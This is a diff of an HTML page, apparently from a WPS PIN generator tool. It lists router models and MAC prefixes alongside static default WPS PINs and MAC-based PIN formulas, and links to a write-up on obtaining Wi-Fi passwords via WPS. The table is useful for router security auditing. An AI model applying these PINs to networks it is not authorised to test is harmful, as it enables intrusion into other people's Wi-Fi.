+  B8:55:10:xx:xx:xx
+  B8:EE:0E:xx:xx:xx
+  BC:34:00:xx:xx:xx
+  BC:96:80:xx:xx:xx
+  C8:91:F9:xx:xx:xx
+  D0:0E:D9:0x:xx:xx
+  D0:84:B0:xx:xx:xx
+  D8:FE:E3:xx:xx:xx
+  E4:BE:ED:xx:xx:xx
+  E8:94:F6:F6:xx:xx
+  EC:1A:59:71:xx:xx
+  EC:4C:4D:xx:xx:xx
+  F4:28:53:xx:xx:xx
+  F4:3E:61:xx:xx:xx
+  F4:6B:EF:xx:xx:xx
+  F8:AB:05:xx:xx:xx
+  FC:8B:97:xx:xx:xx
+D-Link DIR-600
+D-Link DIR-600M
+D-Link DIR-615
+  70:62:B8:xx:xx:xx
+  78:54:2E:xx:xx:xx
+  C0:A0:BB:8C:xx:xx
+  C4:12:F5:xx:xx:xx
+  C4:A8:1D:xx:xx:xx
+  E8:CC:18:xx:xx:xx
+  EC:22:80:xx:xx:xx
+  F8:E9:03:F4:xx:xx
+
+Technical details:
+https://forum.antichat.ru/posts/3978417/</textarea>
+
+<textarea id=pinAirocon>Airocon Realtek RTL867x
+  00:07:26:2F:xx:xx
+  00:0B:2B:4A:xx:xx
+  00:0E:F4:E7:xx:xx
+  00:13:33:Bx:xx:xx
+  00:17:7C:xx:xx:xx
+  00:1A:EF:xx:xx:xx
+  00:E0:4B:B3:xx:xx
+  02:10:18:01:xx:xx
+  08:10:73:4x:xx:xx
+  08:10:77:10:xx:xx
+  10:13:EE:0x:xx:xx
+  2C:AB:25:C7:xx:xx
+  78:8C:54:xx:xx:xx
+  80:3F:5D:F6:xx:xx
+  94:FB:B2:xx:xx:xx
+  BC:96:80:xx:xx:xx
+  F4:3E:61:xx:xx:xx
+  FC:8B:97:xx:xx:xx
+
+Technical details:
+https://forum.antichat.ru/posts/3975451/</textarea>
+
+<textarea id=pinInvNIC>Unknown, for testing
+
+Technical details:
+Pin = Inv(MAC[7..12])</textarea>
+
+<textarea id=pinNIC2>Unknown, for testing
+
+Technical details:
+Pin = MAC[7..12] * 2</textarea>
+
+<textarea id=pinNIC3>Unknown, for testing
+
+Technical details:
+Pin = MAC[7..12] * 3</textarea>
+
+<textarea id=pinOUIaddNIC>Unknown, for testing
+
+Technical details:
+Pin = MAC[1..6] + MAC[7..12]</textarea>
+
+<textarea id=pinOUIsubNIC>Unknown, for testing
+
+Technical details:
+Pin = MAC[1..6] - MAC[7..12]</textarea>
+
+<textarea id=pinOUIxorNIC>Unknown, for testing
+
+Technical details:
+Pin = MAC[1..6] ^ MAC[7..12]</textarea>
+
+<textarea id=pinEmpty>D-Link DIR-620
+  E4:6F:13:xx:xx:xx
+  EC:22:80:xx:xx:xx
+  WSC Device Names:
+    DIR-620
+D-Link DIR-822
+  58:D5:6E:xx:xx:xx
+  WSC Device Names:
+    DIR-822
+D-Link DIR-825/AC
+  10:62:EB:xx:xx:xx
+  10:BE:F5:xx:xx:xx
+  1C:5F:2B:xx:xx:xx
+  80:26:89:xx:xx:xx
+  A0:AB:1B:xx:xx:xx
+  WSC Device Names:
+    DIR-825AC
+D-Link DIR-825/AC/G1
+  74:DA:DA:xx:xx:xx
+  WSC Device Names:
+    DIR-825ACG1
+D-Link DSL-2640U
+  9C:D6:43:xx:xx:xx
+  WSC Device Names:
+    DSL-2640U
+Huawei HG658c
+  68:A0:F6:xx:xx:xx
+Huawei B683-24V 3G
+  0C:96:BF:xx:xx:xx
+  20:F3:A3:xx:xx:xx
+  78:F5:FD:xx:xx:xx
+  AC:E2:15:xx:xx:xx
+  C8:D1:5E:xx:xx:xx
+  WSC Device Names:
+    3G Wireless gateway
+SERCOMM RV6688BCM
+  00:0E:8F:xx:xx:xx
+  D4:21:22:xx:xx:xx
+  WSC Device Names:
+    RV6688BCM
+SERCOMM WiFire S1010
+  3C:98:72:xx:xx:xx
+  78:81:02:xx:xx:xx
+  78:94:B4:xx:xx:xx
+  D4:60:E3:xx:xx:xx
+  E0:60:66:xx:xx:xx
+  WSC Device Names:
+    S1010
+ZTE ZXHN H108N
+  00:4A:77:xx:xx:xx
+  2C:95:7F:xx:xx:xx
+  64:13:6C:xx:xx:xx
+  74:A7:8E:xx:xx:xx
+  88:D2:74:xx:xx:xx
+ZTE ZXHN H118N
+ZTE ZXHN H218N
+  70:2E:22:xx:xx:xx
+  74:B5:7E:xx:xx:xx
+  78:96:82:xx:xx:xx
+  7C:39:53:xx:xx:xx
+  8C:68:C8:xx:xx:xx
+  D4:76:EA:xx:xx:xx
+  WSC Device Names:
+    ADSL Modem/Router
+ZTE ZXHN H298N
+  34:4D:EA:xx:xx:xx
+  38:D8:2F:xx:xx:xx
+  54:BE:53:xx:xx:xx
+  70:9F:2D:xx:xx:xx
+  94:A7:B7:xx:xx:xx
+  98:13:33:xx:xx:xx
+  CA:A3:66:xx:xx:xx
+  D0:60:8C:xx:xx:xx
+
+Technical details:
+Pin = ""
+https://hg658c.wordpress.com/2015/06/20/obtaining-the-wifi-password-in-a-few-seconds-using-wps/</textarea>
+
+<textarea id=pinCisco>ASUS RT-N12 HG
+  00:1A:2B:xx:xx:xx
+  WSC Device Names:
+    ASUS Wireless Router
+Cisco DPC2420
+Cisco EPC2100R2
+Cisco EPC2325
+  00:24:8C:xx:xx:xx
+  00:26:18:xx:xx:xx
+  34:4D:EB:xx:xx:xx
+  70:71:BC:xx:xx:xx
+  E0:69:95:xx:xx:xx
+  E0:CB:4E:xx:xx:xx
+Huawei Technologies HG8245T
+  70:54:F5:xx:xx:xx
+  WSC Device Names:
+    Atheros AP
+
+Technical details:
+Pin = 1234567</textarea>
+
+<textarea id=pinBrcm1>Broadcom firmwares
+D-Link DSL-2640U
+D-Link DSL-2650U
+D-Link DSL-2740U
+D-Link DSL-2750U
+  AC:F1:DF:xx:xx:xx
+  BC:F6:85:xx:xx:xx
+  C8:D3:A3:xx:xx:xx
+Sagemcom F@ST3804
+  98:8B:5D:xx:xx:xx
+Starnet AR800
+  00:1A:A9:xx:xx:xx
+  14:14:4B:xx:xx:xx
+Modem Supply MSW41p4 v2.5
+  EC:62:64:xx:xx:xx
+
+Technical details:
+Pin = 2017252</textarea>
+
+<textarea id=pinBrcm2>D-Link DSL-2600U
+D-Link DSL-2640U
+D-Link DSL-2640NRU
+D-Link DSL-2740U
+  14:D6:4D:xx:xx:xx
+  1C:7E:E5:xx:xx:xx
+  28:10:7B:xx:xx:xx
+  84:C9:B2:xx:xx:xx
+  B8:A3:86:xx:xx:xx
+  BC:F6:85:xx:xx:xx
+  C8:BE:19:xx:xx:xx
+  WSC Device Names:
+    BroadcomAP
+
+Technical details:
+Pin = 4626484</textarea>
+
+<textarea id=pinBrcm3>D-Link DSL-2600U
+D-Link DSL-2640U
+D-Link DSL-2640NRU
+D-Link DSL-2740U
+  14:D6:4D:xx:xx:xx
+  1C:7E:E5:xx:xx:xx
+  28:10:7B:xx:xx:xx
+  B8:A3:86:xx:xx:xx
+  BC:F6:85:xx:xx:xx
+  C8:BE:19:xx:xx:xx
+  WSC Device Names:
+    BroadcomAP
+Sagemcom F@ST2304v2 MTS
+  7C:03:4C:xx:xx:xx
+  WSC Device Names:
+    BroadcomAP
+
+Technical details:
+Pin = 7622990</textarea>
+
+<textarea id=pinBrcm4>D-Link DSL-2640U
+D-Link DSL-2640U
+D-Link DSL-2640NRU
+D-Link DSL-2650NRU
+D-Link DSL-2740U
+D-Link DSL-2740NRU
+D-Link DSL-2750B
+D-Link DSL-2750U
+  14:D6:4D:xx:xx:xx
+  1C:7E:E5:xx:xx:xx
+  28:10:7B:xx:xx:xx
+  84:C9:B2:xx:xx:xx
+  B8:A3:86:xx:xx:xx
+  BC:F6:85:xx:xx:xx
+  C8:BE:19:xx:xx:xx
+  C8:D3:A3:xx:xx:xx
+  CC:B2:55:xx:xx:xx
+  FC:75:16:xx:xx:xx
+NETGEAR JDGN1000
+  20:4E:7F:xx:xx:xx
+Sagemcom F@ST2704v2
+  4C:17:EB:xx:xx:xx
+Sagemcom F@ST2704R
+Sagemcom F@ST2804V7
+  18:62:2C:xx:xx:xx
+  7C:03:D8:xx:xx:xx
+  D8:6C:E9:xx:xx:xx
+
+Technical details:
+Pin = 6232714</textarea>
+
+<textarea id=pinBrcm5>D-Link DSL-2640U
+D-Link DSL-2640U
+D-Link DSL-2640NRU
+D-Link DSL-2650NRU
+D-Link DSL-2740U
+D-Link DSL-2740NRU
+D-Link DSL-2750B
+D-Link DSL-2750U
+  14:D6:4D:xx:xx:xx
+  1C:7E:E5:xx:xx:xx
+  28:10:7B:xx:xx:xx
+  84:C9:B2:xx:xx:xx
+  B8:A3:86:xx:xx:xx
+  BC:F6:85:xx:xx:xx
+  C8:BE:19:xx:xx:xx
+  C8:D3:A3:xx:xx:xx
+  CC:B2:55:xx:xx:xx
+  FC:75:16:xx:xx:xx
+NETGEAR JDGN1000
+  20:4E:7F:xx:xx:xx
+Sagemcom F@ST2704v2
+  4C:17:EB:xx:xx:xx
+Sagemcom F@ST2704R
+Sagemcom F@ST2804V7
+  18:62:2C:xx:xx:xx
+  7C:03:D8:xx:xx:xx
+  D8:6C:E9:xx:xx:xx
+
+Technical details:
+Pin = 1086411</textarea>
+
+<textarea id=pinBrcm6>D-Link DSL-2640U
+D-Link DSL-2640U
+D-Link DSL-2640NRU
+D-Link DSL-2650NRU
+D-Link DSL-2740U
+D-Link DSL-2740NRU
+D-Link DSL-2750B
+D-Link DSL-2750U
+  14:D6:4D:xx:xx:xx
+  1C:7E:E5:xx:xx:xx
+  28:10:7B:xx:xx:xx
+  84:C9:B2:xx:xx:xx
+  B8:A3:86:xx:xx:xx
+  BC:F6:85:xx:xx:xx
+  C8:BE:19:xx:xx:xx
+  C8:D3:A3:xx:xx:xx
+  CC:B2:55:xx:xx:xx
+  FC:75:16:xx:xx:xx
+NETGEAR JDGN1000
+  20:4E:7F:xx:xx:xx
+Sagemcom F@ST2704v2
+  4C:17:EB:xx:xx:xx
+Sagemcom F@ST2704R
+Sagemcom F@ST2804V7
+  18:62:2C:xx:xx:xx
+  7C:03:D8:xx:xx:xx
+  D8:6C:E9:xx:xx:xx
+
+Technical details:
+Pin = 3195719</textarea>
+
+<textarea id=pinAirc1>Airocon F@st 1744, v2
+  18:1E:78:xx:xx:xx
+  40:F2:01:xx:xx:xx
+  44:E9:DD:xx:xx:xx
+  D0:84:B0:xx:xx:xx
+
+Technical details:
+Pin = 3043203</textarea>
+
+<textarea id=pinAirc2>Airocon F@st 1744, v2.2
+  84:A4:23:xx:xx:xx
+  8C:10:D4:xx:xx:xx
+Airocon F@st 1744, v4
+  88:A6:C6:xx:xx:xx
+
+Technical details:
+Pin = 7141225</textarea>
+
+<textarea id=pinDSL2740R>D-Link DSL-2740R
+  00:26:5A:xx:xx:xx
+  1C:BD:B9:xx:xx:xx
+  34:08:04:xx:xx:xx
+  5C:D9:98:xx:xx:xx
+  84:C9:B2:xx:xx:xx
+  FC:75:16:xx:xx:xx
+
+Technical details:
+Pin = 6817554</textarea>
+
+<textarea id=pinRealtek1>Realtek firmwares
+TRENDnet TEW-432BRP (Realtek)
+TRENDnet TEW-432BRP/C (Realtek)
+  00:14:D1:xx:xx:xx
+TechnicLAN WAR-54GS (Realtek)
+Intellinet 503693 (Realtek)
+  00:0C:42:xx:xx:xx
+  00:0E:E8:xx:xx:xx
+
+Technical details:
+Pin = 9566146</textarea>
+
+<textarea id=pinRealtek2>Netis WF2780
+  00:72:63:xx:xx:xx
+  E4:BE:ED:xx:xx:xx
+  WSC Device Names:
+    RTK_AP
+
+Technical details:
+Pin = 9571911</textarea>
+
+<textarea id=pinRealtek3>Sercomm Wifire S1010 (Realtek)
+  08:C6:B3:xx:xx:xx
+
+Technical details:
+Pin = 4856371</textarea>
+
+<textarea id=pinUpvel>Upvel (some firmwares)
+Upvel UR-315BN
+Upvel UR-325BN
+  78:44:76:xx:xx:xx
+  D4:BF:7F:0x:xx:xx
+  F8:C0:91:xx:xx:xx
+
+Technical details:
+Pin = 2085483</textarea>
+
+<textarea id=pinUR814AC>Upvel UR-814AC
+  D4:BF:7F:60:xx:xx
+
+Technical details:
+Pin = 4397768</textarea>
+
+<textarea id=pinUR825AC>Upvel UR-825AC
+Upvel UR-825N4G
+  D4:BF:7F:5x:xx:xx
+  WSC Device Names:
+    UR-825N4G
+
+Technical details:
+Pin = 0529417</textarea>
+
+<textarea id=pinOnlime>Upvel Onlime UR-315BN
+Upvel Onlime UR-319BN
+  D4:BF:7F:xx:xx:xx
+  F8:C0:91:xx:xx:xx
+  WSC Device Names:
+    RTK_AP
+    RTK_AP_2x
+TOTOLINK N150RT
+TOTOLINK N300RT
+  14:4D:67:xx:xx:xx
+  78:44:76:xx:xx:xx
+  WSC Device Names:
+    RTL8196E
+TRENDnet (rarely)
+TRENDnet TEW-637AP
+TRENDnet TEW-638APB
+  00:14:D1:xx:xx:xx
+
+Technical details:
+Pin = 9995604</textarea>
+
+<textarea id=pinEdimax>EDIMAX BR6228GNS
+EDIMAX BR6258GN
+EDIMAX BR6428GN
+EDIMAX BR6428NS
+  80:1F:02:xx:xx:xx
+  00:E0:4C:xx:xx:xx
+
+Technical details:
+Pin = 3561153</textarea>
+
+<textarea id=pinThomson>Thomson/Technicolor
+  00:26:24:xx:xx:xx
+  44:32:C8:xx:xx:xx
+  88:F7:C7:xx:xx:xx
+  CC:03:FA:xx:xx:xx
+
+Technical details:
+Pin = 6795814</textarea>
+
+<textarea id=pinHG532x>Huawei EchoLife HG532e
+Huawei EchoLife HG532n
+Huawei EchoLife HG532s
+  00:66:4B:xx:xx:xx
+  08:63:61:xx:xx:xx
+  08:7A:4C:xx:xx:xx
+  0C:96:BF:xx:xx:xx
+  14:B9:68:xx:xx:xx
+  20:08:ED:xx:xx:xx
+  24:69:A5:xx:xx:xx
+  34:6B:D3:xx:xx:xx
+  78:6A:89:xx:xx:xx
+  88:E3:AB:xx:xx:xx
+  9C:C1:72:xx:xx:xx
+  AC:E2:15:xx:xx:xx
+  D0:7A:B5:xx:xx:xx
+  CC:A2:23:xx:xx:xx
+  E8:CD:2D:xx:xx:xx
+  F8:01:13:xx:xx:xx
+  F8:3D:FF:xx:xx:xx
+
+Technical details:
+Pin = 3425928</textarea>
+
+<textarea id=pinH108L>ZTE ZXV10H108L
+  4C:09:B4:xx:xx:xx
+  4C:AC:0A:xx:xx:xx
+  84:74:2A:4x:xx:xx
+  9C:D2:4B:xx:xx:xx
+  B0:75:D5:xx:xx:xx
+  C8:64:C7:xx:xx:xx
+  DC:02:8E:xx:xx:xx
+  FC:C8:97:xx:xx:xx
+  WSC Device Names:
+    H108L
+
+Technical details:
+Pin = 9422988
+https://forum.antichat.ru/posts/3932800/</textarea>
+
+<textarea id=pinONO>CBN CH6640E
+  5C:35:3B:xx:xx:xx
+  DC:53:7C:xx:xx:xx
+
+Technical details:
+Pin = 9575521</textarea>
+</div>
+</div>
+
+<div class=footer>&copy; 2015-2022 akokarev, binarymaster, Felis-Sapiens, Fusix</div>
+
+<div class=modal>
+	<div class=modal_bkg onclick="hideModal()"></div>
+	<div class=modal_cnt align=center id=win_login>
+	</div>
+	<div class=modal_cnt align=center id=win_reg>
+	</div>
+	<div class=modal_cnt align=center id=win_newpass>
+	</div>
+	<div style="position: absolute" align=center id=win_wait>
+	</div>
+</div>
+<!--Google Analytics-->
+<script async src="https://www.googletagmanager.com/gtag/js?id=UA-133751875-1"></script>
+<script>
+  window.dataLayer = window.dataLayer || [];
+  function gtag(){dataLayer.push(arguments);}
+  gtag('js', new Date());
+
+  gtag('config', 'UA-133751875-1');
+</script>
+<!--/Google Analytics--></body>
+</html>
